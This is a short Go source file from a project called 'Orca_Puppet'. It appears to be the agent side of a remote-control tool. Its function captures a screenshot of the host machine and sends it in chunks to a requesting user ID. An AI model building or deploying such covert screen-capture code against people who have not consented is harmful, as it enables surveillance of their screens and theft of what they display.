package controller

import (
	"Orca_Puppet/cli/cmdopt/screenopt"
	"Orca_Puppet/define/retcode"
	"log"
)

func screenCmd(sendUserId string) {
	imgData, err := screenopt.TakeScreenshotData()
	if err != nil {
		return
	}
	metaInfoMsg := screenopt.GetScreenMetaInfo(imgData)
	retData := screenopt.SendScreenMetaMsg(sendUserId, metaInfoMsg)
	if retData.Code != retcode.SUCCESS {
		log.Println("send failed")
		return
	}
	// 分片发送文件
	screenopt.SendScreenData(sendUserId, imgData)
}
